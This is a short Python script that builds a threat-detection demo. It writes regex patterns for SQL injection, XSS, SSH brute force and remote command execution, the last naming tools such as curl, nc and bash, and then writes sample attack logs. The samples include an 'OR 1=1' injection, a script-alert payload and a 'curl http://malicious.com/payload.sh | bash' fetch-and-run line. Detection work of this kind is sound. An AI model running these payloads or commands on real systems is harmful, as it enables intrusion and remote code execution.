import os
import json

# Recreate environment after code state reset
base_dir = "/mnt/data/unified_threat_demo"
log_dir = os.path.join(base_dir, "logs")
os.makedirs(log_dir, exist_ok=True)

# 1. Write attack_patterns.json
attack_patterns = [
    {
        "id": "SQLI_01",
        "name": "SQL Injection Attempt",
        "regex": "select .* from .* where .*"
    },
    {
        "id": "SQLI_02",
        "name": "SQL Injection - OR 1=1",
        "regex": "('|\\\")? ?or ?1 ?= ?1"
    },
    {
        "id": "XSS_01",
        "name": "XSS Injection - Basic",
        "regex": "<script>.*</script>"
    },
    {
        "id": "XSS_02",
        "name": "XSS - Alert",
        "regex": "alert\\(.*\\)"
    },
    {
        "id": "BRUTE_01",
        "name": "SSH Brute Force Failed Login",
        "regex": "Failed password for .* from .* port .* ssh2"
    },
    {
        "id": "RCE_01",
        "name": "Remote Command Execution Attempt",
        "regex": "(wget|curl|bash|nc|ncat|python3?) .*"
    }
]
with open(os.path.join(base_dir, "attack_patterns.json"), "w") as f:
    json.dump(attack_patterns, f, indent=2)

# 2. Sample logs
sample_logs = {
    "sql_attack.log": [
        "SELECT * FROM users WHERE username = 'admin' OR 1=1;"
    ],
    "xss_attack.log": [
        "<script>alert('Hacked')</script>"
    ],
    "ssh_attack.log": [
        "Jul 11 10:00:00 kali sshd[1234]: Failed password for invalid user admin from 192.168.0.10 port 22 ssh2"
    ],
    "rce_attack.log": [
        "curl http://malicious.com/payload.sh | bash"
    ]
}

# Write sample logs
for filename, lines in sample_logs.items():
    with open(os.path.join(log_dir, filename), "w") as f:
        f.write("\n".join(lines))

base_dir  # Return path for user to access these files.
